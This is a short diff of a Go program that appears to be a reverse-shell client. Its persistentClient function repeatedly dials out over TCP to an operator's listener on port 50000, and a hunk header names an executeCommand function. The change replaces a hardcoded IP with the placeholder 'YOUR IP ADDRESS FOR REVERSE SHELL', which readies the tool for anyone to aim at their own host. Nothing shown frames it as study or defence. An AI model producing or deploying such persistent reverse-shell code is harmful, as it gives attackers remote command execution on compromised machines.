@@ -93,7 +93,7 @@ func executeCommand(cmd string) (string, error) {
 // Persistent client that reconnects to your listener
 func persistentClient() {
 	for {
-		conn, err := net.Dial("tcp", "192.168.0.20:50000")
+		conn, err := net.Dial("tcp", "YOUR IP ADDRESS FOR REVERSE SHELL:50000")
 		if err != nil {
 			fmt.Println("Failed to connect, retrying in 5s...")
 			time.Sleep(5 * time.Second)
@@ -137,3 +137,4 @@ func main() {
 	}
 	log.Println("Server exited gracefully")
 }
+
